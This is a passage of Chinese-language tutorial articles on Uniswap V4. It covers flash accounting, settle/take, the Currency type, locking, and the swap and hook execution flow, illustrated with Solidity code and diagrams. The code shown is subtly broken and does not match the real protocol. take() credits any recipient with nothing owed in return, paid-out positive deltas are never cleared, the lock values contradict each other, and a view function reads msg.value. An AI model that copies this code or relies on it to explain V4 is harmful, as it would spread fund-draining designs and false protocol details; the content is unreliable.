数据结构详解\n/// @notice 账户差额记录\n/// @dev int256类型：\n///      正数 = 用户应收款（Pool欠用户）\n///      负数 = 用户应付款（用户欠Pool）\nmapping(address account =&gt; mapping(Currency currency =&gt; int256)) public deltas;\n \n/// @notice 差额变化\n/// @dev 表示两种代币的变化\nstruct BalanceDelta {\n    int256 delta0;  // token0的差额\n    int256 delta1;  // token1的差额\n}\n差额记录示意图：\nflowchart LR\n    subgraph UserA[&quot;用户A账户&quot;]\n        D1[&quot;deltas[A][ETH] = +1.5&lt;br/&gt;应收1.5 ETH&quot;]\n        D2[&quot;deltas[A][USDC] = -3000&lt;br/&gt;应付3000 USDC&quot;]\n    end\n\n    subgraph UserB[&quot;用户B账户&quot;]\n        D3[&quot;deltas[B][ETH] = -0.5&lt;br/&gt;应付0.5 ETH&quot;]\n        D4[&quot;deltas[B][USDC] = +1000&lt;br/&gt;应收1000 USDC&quot;]\n    end\n\n    subgraph PoolManager[&quot;PoolManager结算&quot;]\n        S1[&quot;结算时&lt;br/&gt;统一转账&quot;]\n    end\n\n    UserA --&gt; S1\n    UserB --&gt; S1\n\n    style D1 fill:#c8e6c9\n    style D2 fill:#ffcdd2\n    style D3 fill:#ffcdd2\n    style D4 fill:#c8e6c9\n\n3.3 settle() 函数\n用户通过settle()声明将支付一定数量的代币：\n/// @notice 用户声明将支付代币\n/// @param currency 要支付的代币\n/// @param amount 支付数量\nfunction settle(Currency currency, uint256 amount) external {\n    // 1. 验证锁定状态\n    require(locked != 0, &quot;Not locked&quot;);\n \n    // 2. 记录用户需要支付的金额（负数 = 应付）\n    deltas[msg.sender][currency] -= int256(amount);\n \n    // 3. 对于原生ETH，立即验证msg.value\n    if (CurrencyLibrary.isNative(currency)) {\n        uint256 currentDelta = -deltas[msg.sender][currency];\n        require(msg.value &gt;= currentDelta, &quot;Insufficient ETH&quot;);\n    }\n \n    // 4. 对于ERC20，延迟到unlock时统一transferFrom\n    emit Settle(msg.sender, currency, amount);\n}\n \n/// @notice 获取用户应付的ETH数量\nfunction settleableBalance(Currency currency) external view returns (uint256) {\n    if (!CurrencyLibrary.isNative(currency)) return 0;\n \n    int256 delta = deltas[msg.sender][currency];\n    if (delta &gt;= 0) return 0;\n \n    uint256 payableAmount = uint256(-delta);\n    require(msg.value &gt;= payableAmount, &quot;Insufficient ETH&quot;);\n \n    return payableAmount;\n}\n3.4 take() 函数\n用户通过take()声明将接收一定数量的代币：\n/// @notice 用户声明将接收代币\n/// @param currency 要接收的代币\n/// @param recipient 接收地址\n/// @param amount 接收数量\nfunction take(Currency currency, address recipient, uint256 amount) external {\n    // 1. 验证锁定状态\n    require(locked != 0, &quot;Not locked&quot;);\n \n    // 2. 记录用户应收的金额（正数 = 应收）\n    deltas[recipient][currency] += int256(amount);\n \n    emit Take(msg.sender, recipient, currency, amount);\n}\n3.5 结算机制\n在unlock()时进行最终结算：\n/// @notice 解锁并结算所有差额\nfunction unlock() external {\n    // 1. 验证锁定状态\n    require(locked == 1, &quot;Not locked&quot;);\n \n    // 2. 结算所有账户的差额\n    _accountingBalance();\n \n    // 3. 解除锁定\n    locked = 0;\n \n    emit Unlock();\n}\n \n/// @notice 内部结算函数\nfunction _accountingBalance() internal {\n    // 遍历所有有差额的账户\n    for (uint256 i = 0; i &lt; accounts.length; i++) {\n        address account = accounts[i];\n \n        // 遍历所有有差额的代币\n        for (uint256 j = 0; j &lt; currencies.length; j++) {\n            Currency currency = currencies[j];\n            int256 delta = deltas[account][currency];\n \n            if (delta == 0) continue;\n \n            if (delta &gt; 0) {\n                // 用户应收：Pool转给用户\n                uint256 amount = uint256(delta);\n \n                if (CurrencyLibrary.isNative(currency)) {\n                    // 原生ETH直接发送\n                    payable(account).transfer(amount);\n                } else {\n                    // ERC20转账\n                    ERC20(Currency.unwrap(currency)).transfer(account, amount);\n                }\n            } else {\n                // 用户应付：从用户转入\n                uint256 amount = uint256(-delta);\n \n                if (!CurrencyLibrary.isNative(currency)) {\n                    // ERC20: transferFrom\n                    ERC20(Currency.unwrap(currency)).transferFrom(\n                        account,\n                        address(this),\n                        amount\n                    );\n                }\n                // ETH在settle时已经验证msg.value\n \n                // 清零差额\n                deltas[account][currency] = 0;\n            }\n        }\n    }\n \n    // 清空账户和代币列表\n    delete accounts;\n    delete currencies;\n}\n3.6 批量操作优化\n瞬时会计最大的优势是支持批量操作：\n/// @notice 批量交换多个池子\nfunction batchSwap(\n    PoolKey[] calldata keys,\n    SwapParams[] calldata params\n) external returns (BalanceDelta) {\n    // 锁定\n    lock();\n \n    BalanceDelta totalDelta;\n \n    // 执行多次swap，所有差额累积\n    for (uint256 i = 0; i &lt; keys.length; i++) {\n        BalanceDelta delta = swap(keys[i], params[i]);\n        totalDelta.delta0 += delta.delta0;\n        totalDelta.delta1 += delta.delta1;\n    }\n \n    // 一次性结算\n    _settleAndTake(totalDelta);\n \n    // 解锁\n    unlock();\n \n    return totalDelta;\n}\n \n/// @notice 内部结算函数\nfunction _settleAndTake(BalanceDelta calldata delta) internal {\n    if (delta.delta0 &lt; 0) {\n        settle(poolKey.currency0, uint256(-delta.delta0));\n    } else if (delta.delta0 &gt; 0) {\n        take(poolKey.currency0, msg.sender, uint256(delta.delta0));\n    }\n \n    if (delta.delta1 &lt; 0) {\n        settle(poolKey.currency1, uint256(-delta.delta1));\n    } else if (delta.delta1 &gt; 0) {\n        take(poolKey.currency1, msg.sender, uint256(delta.delta1));\n    }\n}\n批量操作Gas对比：\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n操作V3（多次调用）V4（批量）节省3跳交易~300,000 gas~180,000 gas40%5跳交易~500,000 gas~250,000 gas50%\n\n4. Currency类型系统\n4.1 统一代币表示\nV4引入Currency类型统一处理ETH和ERC20：\n/// @notice Currency类型\n/// @dev 本质上是address，但提供类型安全\ntype Currency is address;\n \n/// @notice Currency库\nlibrary CurrencyLibrary {\n    /// @notice 原生ETH的Currency表示\n    Currency internal constant NATIVE = Currency.wrap(address(0));\n \n    /// @notice 判断是否为原生ETH\n    function isNative(Currency currency) internal pure returns (bool) {\n        return Currency.unwrap(currency) == address(0);\n    }\n \n    /// @notice 从地址创建Currency\n    function wrap(address addr) internal pure returns (Currency) {\n        return Currency.wrap(addr);\n    }\n \n    /// @notice 获取底层地址\n    function unwrap(Currency currency) internal pure returns (address) {\n        return Currency.unwrap(currency);\n    }\n \n    /// @notice 获取转账编码\n    function transferEncoding(Currency currency) internal pure returns (bytes memory) {\n        if (isNative(currency)) {\n            return abi.encodePacked(); // ETH不需要编码\n        } else {\n            // ERC20的transfer编码\n            return abi.encodeWithSignature(\n                &quot;transfer(address,uint256)&quot;,\n                address(0),\n                uint256(0)\n            );\n        }\n    }\n}\n4.2 Currency操作\n/// @notice 安全转账\nfunction _transfer(\n    Currency currency,\n    address recipient,\n    uint256 amount\n) internal {\n    if (CurrencyLibrary.isNative(currency)) {\n        // 原生ETH\n        payable(recipient).transfer(amount);\n    } else {\n        // ERC20\n        ERC20(Currency.unwrap(currency)).transfer(recipient, amount);\n    }\n}\n \n/// @notice 安全转账从\nfunction _transferFrom(\n    Currency currency,\n    address from,\n    address to,\n    uint256 amount\n) internal {\n    if (CurrencyLibrary.isNative(currency)) {\n        // ETH需要msg.value\n        require(msg.value &gt;= amount, &quot;Insufficient ETH&quot;);\n    } else {\n        // ERC20 transferFrom\n        ERC20(Currency.unwrap(currency)).transferFrom(from, to, amount);\n    }\n}\n \n/// @notice 获取余额\nfunction _balanceOf(\n    Currency currency,\n    address account\n) internal view returns (uint256) {\n    if (CurrencyLibrary.isNative(currency)) {\n        return account.balance;\n    } else {\n        return ERC20(Currency.unwrap(currency)).balanceOf(account);\n    }\n}\n4.3 Native ETH支持\nflowchart TD\n    A[用户操作] --&gt; B{Currency类型}\n    B --&gt;|address(0)| C[原生ETH]\n    B --&gt;|address(token)| D[ERC20代币]\n\n    C --&gt; E[直接使用msg.value]\n    C --&gt; F[transfer直接发送]\n    C --&gt; G[无需授权]\n\n    D --&gt; H[需要transferFrom]\n    D --&gt; I[需要allowance]\n    D --&gt; J[需要包装如WETH]\n\n    style C fill:#c8e6c9\n    style E fill:#c8e6c9\n    style F fill:#c8e6c9\n    style G fill:#c8e6c9\n\nGas节省对比（ETH相关交易）：\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n操作V3 (WETH)V4 (Native)节省WETH包装~40,0000100%WETH解包~40,0000100%授权检查~5,0000100%单笔交易~85,000~45,000~47%\n\n5. 安全性保障\n5.1 锁定机制\n/// @notice 全局锁定状态\nuint256 private locked = 1;  // 初始为1（未锁定）\n \n/// @notice 锁定修饰符\nmodifier lock() {\n    require(locked == 1, &quot;Already locked&quot;);\n    locked = 2;  // 设置为锁定状态\n \n    _;\n \n    // unlock时进行结算\n    _accountingBalance();\n    locked = 1;  // 恢复未锁定\n}\n \n/// @notice 解锁函数\nfunction unlock() external {\n    require(locked == 2, &quot;Not locked&quot;);\n    _accountingBalance();\n    locked = 1;\n}\n5.2 重入保护\nstateDiagram-v2\n    [*] --&gt; Unlocked: 初始状态\n    Unlocked --&gt; Locked: lock()调用\n    Locked --&gt; Processing: 执行操作\n    Processing --&gt; Locked: 操作完成\n    Locked --&gt; Unlocked: unlock()结算\n    Unlocked --&gt; [*]\n\n    note right of Locked\n        locked = 2\n        所有外部调用\n        都在此状态\n    end note\n\n    note right of Unlocked\n        locked = 1\n        可以进入新的\n        lock()调用\n    end note\n\n5.3 差额验证\n/// @notice 验证所有差额已结算\nfunction _verifyDeltasSettled() internal view {\n    for (uint256 i = 0; i &lt; accounts.length; i++) {\n        address account = accounts[i];\n \n        for (uint256 j = 0; j &lt; currencies.length; j++) {\n            Currency currency = currencies[j];\n            int256 delta = deltas[account][currency];\n \n            // 差额应该为0（已结算）\n            // 或者是用户应收（会在unlock时转账）\n            // 用户应付（负数）必须已经settle\n            require(delta &gt;= 0 || _hasSettled(account, currency), &quot;Delta not settled&quot;);\n        }\n    }\n}\n \n/// @notice 检查用户是否已结算\nfunction _hasSettled(\n    address account,\n    Currency currency\n) private view returns (bool) {\n    if (CurrencyLibrary.isNative(currency)) {\n        // ETH: 检查msg.value是否足够\n        int256 delta = deltas[account][currency];\n        if (delta &lt; 0) {\n            return msg.value &gt;= uint256(-delta);\n        }\n    }\n    // ERC20: 在unlock时transferFrom验证\n    return true;\n}\n5.4 防止资金锁定\n/// @notice 紧急提取函数\n/// @dev 只有在特殊情况下才能调用\nfunction emergencyWithdraw(\n    Currency currency,\n    uint256 amount\n) external {\n    // 1. 验证未锁定\n    require(locked == 1, &quot;Locked&quot;);\n \n    // 2. 验证权限（通常是DAO或治理）\n    require(msg.sender == governance, &quot;Not governance&quot;);\n \n    // 3. 执行提取\n    if (CurrencyLibrary.isNative(currency)) {\n        payable(msg.sender).transfer(amount);\n    } else {\n        ERC20(Currency.unwrap(currency)).transfer(msg.sender, amount);\n    }\n \n    emit EmergencyWithdraw(msg.sender, currency, amount);\n}\n\n6. 本章小结\n6.1 Singleton架构总结\nmindmap\n  root((Singleton架构))\n    PoolManager\n      唯一合约\n      所有池子状态\n      mapping索引\n    PoolKey\n      currency0/currency1\n      fee/tickSpacing\n      hooks地址\n    PoolId\n      keccak256编码\n      唯一标识\n      高效查询\n    优势\n      部署成本降低95%\n      跨池操作优化\n      统一状态管理\n      原子性操作\n\n6.2 瞬时会计总结\nmindmap\n  root((瞬时会计))\n    核心概念\n      延迟转账\n      账面记录\n      最终结算\n    deltas映射\n      正数=应收\n      负数=应付\n      账户级追踪\n    settle函数\n      声明应付款\n      验证msg.value\n      记录差额\n    take函数\n      声明应收款\n      unlock时转账\n    批量操作\n      累积差额\n      一次性结算\n      Gas节省40%+\n\n6.3 Currency系统总结\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n类型表示转账授权Native ETHCurrency.wrap(address(0))transfer()不需要ERC20Currency.wrap(tokenAddr)transfer()需要approve()\n6.4 关键数据结构\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n结构用途类型pools[poolId]池子状态Pool.Stateslot0s[poolId]价格等高频数据Pool.Slot0deltas[account][currency]账户差额int256tickBitmaps[poolId][wordPos]Tick位图uint256ticks[poolId][tick]Tick信息Tick.Info\n\n下一篇预告\n在下一篇文章中，我们将深入探讨交换流程与Hook执行时序，包括：\n\nswap函数完整执行流程\nHook调用链详解\n跨Tick交换机制\nGas成本分析\n与V3的对比\n\n\n参考资料\n\nUniswap V4 Core - PoolManager.sol\nUniswap V4 Core - Pool.sol\nEIP-1155: Multi Token Standard\nEIP-20: ERC-20 Token Standard\n"},"blockchainguide/DApp_Development/应用场景/defi/uniswap/v4/04-交换流程与Hook执行时序":{"slug":"blockchainguide/DApp_Development/应用场景/defi/uniswap/v4/04-交换流程与Hook执行时序","filePath":"blockchainguide/DApp_Development/应用场景/defi/uniswap/v4/04-交换流程与Hook执行时序.md","title":"04-交换流程与Hook执行时序","links":[],"tags":[],"content":"死磕Uniswap V4（四）：交换流程与Hook执行时序\n\n本文是「死磕Uniswap V4」系列的第四篇，深入剖析V4的交换执行流程和Hook调用时序。\n\n系列导航\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n序号标题核心内容01V4概述与架构革命Singleton、Hooks、Flash Accounting02Hooks机制深度解析Hook接口、生命周期、实现模式03单例架构与瞬时会计PoolManager、Currency、Accounting04交换流程与Hook执行时序swap函数、Hook调用链、Gas分析05费用系统与动态费率自定义费率、动态调整、费用分配06账户抽象与原生ETHCurrency类型、settle/take、批量操作07安全分析与最佳实践Hook安全、MEV防护、审计要点\n\n1. swap函数概览\n1.1 函数签名\n/// @notice 执行代币交换\n/// @param key 池子标识\n/// @param params 交换参数\n/// @param limits 金额限制（防止滑点过大）\n/// @return delta 交换产生的代币变化\nfunction swap(\n    PoolKey calldata key,\n    SwapParams calldata params,\n    BalanceDelta calldata limits\n) external lock returns (BalanceDelta delta) {\n    // 实现细节...\n}\n \n/// @notice 交换参数\nstruct SwapParams {\n    bool zeroForOne;           // 交换方向：true=token0→token1\n    int256 amountSpecified;    // 指定数量（正=精确输入，负=精确输出）\n    uint160 sqrtPriceLimitX96; // 价格限制（滑点保护）\n}\n \n/// @notice 金额限制\nstruct BalanceDelta {\n    int256 delta0;  // token0的最大允许变化\n    int256 delta1;  // token1的最大允许变化\n}\n1.2 参数含义详解\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n参数类型说明示例zeroForOnebool交换方向true=卖出token0，false=卖出token1amountSpecifiedint256指定数量1e18=精确输入1个，-1e18=精确输出1个sqrtPriceLimitX96uint160价格限制防止滑点过大delta0/delta1int256金额限制用户能接受的最大损失\n\n2. 交换执行完整流程\n2.1 流程图\nflowchart TB\n    START([开始swap]) --&gt; VALIDATE{参数验证}\n    VALIDATE --&gt;|无效| ERROR1[revert]\n    VALIDATE --&gt;|有效| LOCK[锁定状态&lt;br/&gt;lock]\n\n    LOCK --&gt; GET_POOL[获取池子状态&lt;br/&gt;pools poolId]\n    GET_POOL --&gt; CHECK_HOOK{Hook存在?}\n\n    CHECK_HOOK --&gt;|否| SWAP_LOOP[进入交换循环]\n    CHECK_HOOK --&gt;|是| BEFORE_HOOK[调用beforeSwap Hook]\n\n    BEFORE_HOOK --&gt; HOOK_RESULT{Hook成功?}\n    HOOK_RESULT --&gt;|失败| ERROR2[Hook失败]\n    HOOK_RESULT --&gt;|成功| UPDATE_DELTA[更新deltas&lt;br/&gt;处理Hook返回值]\n\n    UPDATE_DELTA --&gt; SWAP_LOOP\n\n    SWAP_LOOP --&gt; CALC_PRICE[计算目标价格]\n    CALC_PRICE --&gt; COMPUTE_STEP[执行单步交换&lt;br/&gt;computeSwapStep]\n\n    COMPUTE_STEP --&gt; CHECK_LIMIT{到达限制?}\n    CHECK_LIMIT --&gt;|是| UPDATE_PRICE[更新价格]\n    CHECK_LIMIT --&gt;|否| CONTINUE[继续循环]\n\n    UPDATE_PRICE --&gt; CROSS_TICK{跨tick?}\n    CROSS_TICK --&gt;|是| CROSS_ACTION[执行tick跨越&lt;br/&gt;更新流动性]\n    CROSS_TICK --&gt;|否| CHECK_AMOUNT{还有剩余?}\n    CROSS_ACTION --&gt; CHECK_AMOUNT\n\n    CONTINUE --&gt; CHECK_AMOUNT\n    CHECK_AMOUNT --&gt;|是| SWAP_LOOP\n    CHECK_AMOUNT --&gt;|否| AFTER_CHECK{Hook存在?}\n\n    AFTER_CHECK --&gt;|否| VERIFY_LIMIT[验证金额限制]\n    AFTER_CHECK --&gt;|是| AFTER_HOOK[调用afterSwap Hook]\n\n    AFTER_HOOK --&gt; VERIFY_LIMIT[验证金额限制]\n    VERIFY_LIMIT --&gt;|超出| ERROR3[超过限制]\n    VERIFY_LIMIT --&gt;|通过| FINALIZE[最终化结算]\n\n    FINALIZE --&gt; UNLOCK[unlock&lt;br/&gt;结算deltas]\n    UNLOCK --&gt; RETURN([返回BalanceDelta])\n\n    style BEFORE_HOOK fill:#e3f2fd\n    style AFTER_HOOK fill:#e3f2fd\n    style SWAP_LOOP fill:#fff3e0\n\n2.2 详细代码实现\nfunction swap(\n    PoolKey calldata key,\n    SwapParams calldata params,\n    BalanceDelta calldata limits\n) external lock returns (BalanceDelta delta) {\n    // ============================================================\n    // 第1步：验证和准备\n    // ============================================================\n \n    bytes32 poolId = key.poolId;\n \n    // 验证池子存在\n    require(slot0s[poolId].sqrtPriceX96 != 0, &quot;Not initialized&quot;);\n \n    // 验证参数\n    require(params.amountSpecified != 0, &quot;Amount zero&quot;);\n \n    // ============================================================\n    // 第2步：获取初始状态\n    // ============================================================\n \n    Pool.State storage pool = pools[poolId];\n    Pool.Slot0 memory slot0 = slot0s[poolId];\n    Pool.Fees memory fee = fees[poolId];\n \n    uint160 sqrtPriceX96 = slot0.sqrtPriceX96;\n    int24 tick = slot0.tick;\n    uint128 liquidity = pool.liquidity;\n \n    // ============================================================\n    // 第3步：调用beforeSwap Hook\n    // ============================================================\n \n    int256 hookDelta0 = 0;\n    int256 hookDelta1 = 0;\n \n    if (address(key.hooks) != address(0)) {\n        (bool success, bytes memory data) = address(key.hooks).staticcall(\n            abi.encodeCall(\n                IHooks.beforeSwap,\n                (msg.sender, key, params, params.hookData)\n            )\n        );\n \n        if (success) {\n            (\n                bytes4 selector,\n                int256 returnedDelta0,\n                int256 returnedDelta1\n            ) = abi.decode(data, (bytes4, int256, int256));\n \n            if (selector == IHooks.beforeSwap.selector) {\n                hookDelta0 = returnedDelta0;\n                hookDelta1 = returnedDelta1;\n \n                // 更新deltas\n                if (hookDelta0 != 0) {\n                    deltas[msg.sender][key.currency0] += hookDelta0;\n                }\n                if (hookDelta1 != 0) {\n                    deltas[msg.sender][key.currency1] += hookDelta1;\n                }\n            }\n        }\n    }\n \n    // ============================================================\n    // 第4步：主交换循环\n    // ============================================================\n \n    int256 amountSpecified = params.amountSpecified;\n    int256 amountRemaining = amountSpecified;\n    int256 amountCalculated = 0;\n \n    while (amountRemaining != 0 &amp;&amp; sqrtPriceX96 != params.sqrtPriceLimitX96) {\n        // 4.1 查找下一个tick\n        (int24 tickNext, bool initialized) = _getNextTick(\n            poolId,\n            tick,\n            params.zeroForOne\n        );\n \n        // 4.2 计算目标价格\n        uint160 sqrtPriceNextX96 = initialized\n            ? TickMath.getSqrtRatioAtTick(tickNext)\n            : (params.zeroForOne ? TickMath.MIN_SQRT_RATIO + 1 : TickMath.MAX_SQRT_RATIO - 1);\n \n        // 4.3 考虑价格限制\n        if (params.zeroForOne) {\n            sqrtPriceNextX96 = sqrtPriceNextX96 &lt; params.sqrtPriceLimitX96\n                ? params.sqrtPriceLimitX96\n                : sqrtPriceNextX96;\n        } else {\n            sqrtPriceNextX96 = sqrtPriceNextX96 &gt; params.sqrtPriceLimitX96\n                ? params.sqrtPriceLimitX96\n                : sqrtPriceNextX96;\n        }\n \n        // 4.4 执行单步交换\n        (\n            uint160 newSqrtPriceX96,\n            uint256 amountIn,\n            uint256 amountOut,\n            uint256 feeAmount\n        ) = SwapMath.computeSwapStep(\n            sqrtPriceX96,\n            sqrtPriceNextX96,\n            liquidity,\n            amountRemaining,\n            fee.fee + fee.hookFee\n        );\n \n        // 4.5 更新状态\n        sqrtPriceX96 = newSqrtPriceX96;\n        amountRemaining -= params.zeroForOne ? int256(amountIn + feeAmount) : -int256(amountOut);\n        amountCalculated += params.zeroForOne ? int256(amountOut) : -int256(amountIn + feeAmount);\n \n        // 4.6 检查是否跨越tick\n        if (sqrtPriceX96 == sqrtPriceNextX96) {\n            // 到达tick边界\n            if (initialized) {\n                // 执行tick跨越\n                int128 liquidityNet = _crossTick(\n                    poolId,\n                    tick,\n                    tickNext,\n                    params.zeroForOne\n                );\n \n                // 更新流动性\n                if (params.zeroForOne) {\n                    liquidity = uint128(int256(liquidity) - liquidityNet);\n                } else {\n                    liquidity = uint128(int256(liquidity) + liquidityNet);\n                }\n            }\n \n            // 更新tick\n            tick = params.zeroForOne ? tickNext - 1 : tickNext;\n        } else {\n            // 价格未到边界，重新计算tick\n            tick = TickMath.getTickAtSqrtRatio(sqrtPriceX96);\n        }\n    }\n \n    // ============================================================\n    // 第5步：更新池子状态\n    // ============================================================\n \n    slot0s[poolId].sqrtPriceX96 = sqrtPriceX96;\n    slot0s[poolId].tick = tick;\n    pools[poolId].liquidity = liquidity;\n \n    // ============================================================\n    // 第6步：调用afterSwap Hook\n    // ============================================================\n \n    if (address(key.hooks) != address(0)) {\n        (bool success, bytes memory data) = address(key.hooks).staticcall(\n            abi.encodeCall(\n                IHooks.afterSwap,\n                (\n                    msg.sender,\n                    key,\n                    params,\n                    BalanceDelta({\n                        delta0: params.zeroForOne ? amountSpecified - amountRemaining : amountCalculated,\n                        delta1: params.zeroForOne ? amountCalculated : amountRemaining - amountSpecified\n                    }),\n                    params.hookData\n                )\n            )\n        );\n \n        if (success) {\n            bytes4 selector = abi.decode(data, (bytes4));\n            require(selector == IHooks.afterSwap.selector, &quot;Invalid hook return&quot;);\n        }\n    }\n \n    // ============================================================\n    // 第7步：计算最终delta\n    // ============================================================\n \n    delta = BalanceDelta({\n        delta0: params.zeroForOne ? amountSpecified - amountRemaining : amountCalculated,\n        delta1: params.zeroForOne ? amountCalculated : amountRemaining - amountSpecified\n    });\n \n    // ============================================================\n    // 第8步：验证金额限制\n    // ============================================================\n \n    require(delta.delta0 &gt;= limits.delta0, &quot;Limit0 exceeded&quot;);\n    require(delta.delta1 &gt;= limits.delta1, &quot;Limit1 exceeded&quot;);\n \n    return delta;\n}\n\n3. Hook执行时序详解\n3.1 完整时序图\nsequenceDiagram\n    participant U as User\n    participant R as Router\n    participant PM as PoolManager\n    participant BH as BeforeHook\n    participant AH as AfterHook\n    participant T as Token\n\n    U-&gt;&gt;R: swap(key, params, limits)\n    R-&gt;&gt;PM: swap(key, params, limits)\n\n    Note over PM: 第1步：验证和准备\n    PM-&gt;&gt;PM: 验证池子存在\n    PM-&gt;&gt;PM: 验证参数有效性\n\n    Note over PM: 第2步：获取初始状态\n    PM-&gt;&gt;PM: 读取pool状态\n    PM-&gt;&gt;PM: 读取slot0\n    PM-&gt;&gt;PM: 读取费用配置\n\n    Note over PM: 第3步：beforeSwap Hook\n    alt Hook存在\n        PM-&gt;&gt;BH: beforeSwap(sender, key, params)\n        BH--&gt;&gt;PM: (selector, delta0, delta1)\n        PM-&gt;&gt;PM: 更新deltas\n    end\n\n    Note over PM: 第4步：主交换循环\n    loop 每个tick区间\n        PM-&gt;&gt;PM: 查找下一个tick\n        PM-&gt;&gt;PM: 计算目标价格\n        PM-&gt;&gt;PM: computeSwapStep()\n        PM-&gt;&gt;PM: 更新价格和流动性\n        PM-&gt;&gt;PM: 检查是否跨tick\n    end\n\n    Note over PM: 第5步：更新池子状态\n    PM-&gt;&gt;PM: 写入sqrtPriceX96\n    PM-&gt;&gt;PM: 写入tick\n    PM-&gt;&gt;PM: 写入liquidity\n\n    Note over PM: 第6步：afterSwap Hook\n    alt Hook存在\n        PM-&gt;&gt;AH: afterSwap(sender, key, params, delta)\n        AH--&gt;&gt;PM: selector\n    end\n\n    Note over PM: 第7步：计算最终delta\n    PM-&gt;&gt;PM: 计算delta0/delta1\n\n    Note over PM: 第8步：验证限制\n    PM-&gt;&gt;PM: 检查limits\n\n    PM--&gt;&gt;R: return BalanceDelta\n    R--&gt;&gt;U: return delta\n\n    Note over U,T: 第9步：结算（unlock时）\n    U-&gt;&gt;PM: settle(currencyIn, amountIn)\n    U-&gt;&gt;PM: take(currencyOut, amountOut)\n    PM-&gt;&gt;T: transferFrom(user, PM, amountIn)\n    PM-&gt;&gt;T: transfer(user, amountOut)\n\n3.2 beforeSwap Hook执行详解\nfunction _callBeforeSwap(\n    PoolKey calldata key,\n    SwapParams calldata params\n) internal returns (int256 delta0, int256 delta1) {\n    IHooks hooks = key.hooks;\n    if (address(hooks) == address(0)) return (0, 0);\n \n    // 准备调用数据\n    bytes memory data = abi.encodeCall(\n        IHooks.beforeSwap,\n        (msg.sender, key, params, params.hookData)\n    );\n \n    // 静态调用（不允许状态修改）\n    (bool success, bytes memory result) = address(hooks).staticcall(data);\n \n    if (!success) {\n        // Hook未实现或调用失败\n        if (result.length == 0) {\n            return (0, 0); // 未实现，使用默认值\n        }\n        // 调用失败，revert\n        revert(&quot;beforeSwap hook failed&quot;);\n    }\n \n    // 解析返回值\n    (\n        bytes4 selector,\n        int256 returnedDelta0,\n        int256 returnedDelta1\n    ) = abi.decode(result, (bytes4, int256, int256));\n \n    // 验证selector\n    require(selector == IHooks.beforeSwap.selector, &quot;Invalid selector&quot;);\n \n    // 应用Hook返回的delta\n    if (returnedDelta0 != 0) {\n        deltas[msg.sender][key.currency0] += returnedDelta0;\n        delta0 = returnedDelta0;\n    }\n \n    if (returnedDelta1 != 0) {\n        deltas[msg.sender][key.currency1] += returnedDelta1;\n        delta1 = returnedDelta1;\n    }\n}\n3.3 afterSwap Hook执行详解\nfunction _callAfterSwap(\n    PoolKey calldata key,\n    SwapParams calldata params,\n    BalanceDelta calldata delta\n) internal {\n    IHooks hooks = key.hooks;\n    if (address(hooks) == address(0)) return;\n \n    // 准备调用数据\n    bytes memory data = abi.encodeCall(\n        IHooks.afterSwap,\n        (msg.sender, key, params, delta, params.hookData)\n    );\n \n    // 静态调用\n    (bool success, bytes memory result) = address(hooks).staticcall(data);\n \n    if (!success) {\n        // Hook失败不影响主流程\n        return;\n    }\n \n    // 验证selector\n    bytes4 selector = abi.decode(result, (bytes4));\n    require(selector == IHooks.afterSwap.selector, &quot;Invalid selector&quot;);\n \n    // afterSwap还可以返回额外的delta（费用分配）\n    // ...\n}\n\n4. 跨Tick交换机制\n4.1 Tick查找\n/// @notice 获取下一个已初始化的tick\n/// @param poolId 池子ID\n/// @param tick 当前tick\n/// @param zeroForOne 交换方向\n/// @return tickNext 下一个tick\n/// @return initialized 是否已初始化\nfunction _getNextTick(\n    bytes32 poolId,\n    int24 tick,\n    bool zeroForOne\n) private view returns (int24 tickNext, bool initialized) {\n    int24 tickSpacing = tickSpacings[poolId];\n \n    // 对齐到tickSpacing\n    int24 compressed = tick / tickSpacing;\n    if (tick &lt; 0 &amp;&amp; tick % tickSpacing != 0) compressed--;\n \n    // 使用位图查找\n    (int16 wordPos, uint8 bitPos) = _getPosition(compressed);\n \n    if (zeroForOne) {\n        // 向左查找（价格下降）\n        uint256 mask = (1 &lt;&lt; bitPos) - 1 + (1 &lt;&lt; bitPos);\n        uint256 masked = tickBitmaps[poolId][wordPos] &amp; mask;\n \n        if (masked != 0) {\n            uint8 msb = BitMath.mostSignificantBit(masked);\n            tickNext = (int24(wordPos) * 256 + int24(msb)) * tickSpacing;\n            initialized = true;\n        } else {\n            // 查找前一个word\n            // ...\n        }\n    } else {\n        // 向右查找（价格上升）\n        uint256 mask = ~((1 &lt;&lt; (bitPos + 1)) - 1);\n        uint256 masked = tickBitmaps[poolId][wordPos] &amp; mask;\n \n        if (masked != 0) {\n            uint8 lsb = BitMath.leastSignificantBit(masked);\n            tickNext = (int24(wordPos) * 256 + int24(lsb)) * tickSpacing;\n            initialized = true;\n        } else {\n            // 查找后一个word\n            // ...\n        }\n    }\n}\n4.2 Tick跨越\n/// @notice 跨越tick边界\n/// @param poolId 池子ID\n/// @param tick 当前tick\n/// @param tickNext 目标tick\n/// @param zeroForOne 交换方向\n/// @return liquidityNet 流动性净值\nfunction _crossTick(\n    bytes32 poolId,\n    int24 tick,\n    int24 tickNext,\n    bool zeroForOne\n) private returns (int128 liquidityNet) {\n    // 获取tick信息\n    Tick.Info memory tickInfo = ticks[poolId][tickNext];\n \n    // 计算流动性变化\n    liquidityNet = zeroForOne ? -tickInfo.liquidityNet : tickInfo.liquidityNet;\n \n    // 更新tick外部数据\n    // ...\n \n    return liquidityNet;\n}\n4.3 跨Tick流程图\nflowchart TD\n    A[单步交换完成] --&gt; B{价格 == 目标价格?}\n    B --&gt;|否| C[重新计算当前tick]\n    B --&gt;|是| D{tick已初始化?}\n\n    D --&gt;|否| C\n    D --&gt;|是| E[执行tick跨越]\n\n    E --&gt; F[获取liquidityNet]\n    F --&gt; G{zeroForOne?}\n    G --&gt;|true| H[liquidity -= liquidityNet]\n    G --&gt;|false| I[liquidity += liquidityNet]\n\n    H --&gt; J[更新tick]\n    I --&gt; J\n    C --&gt; J\n\n    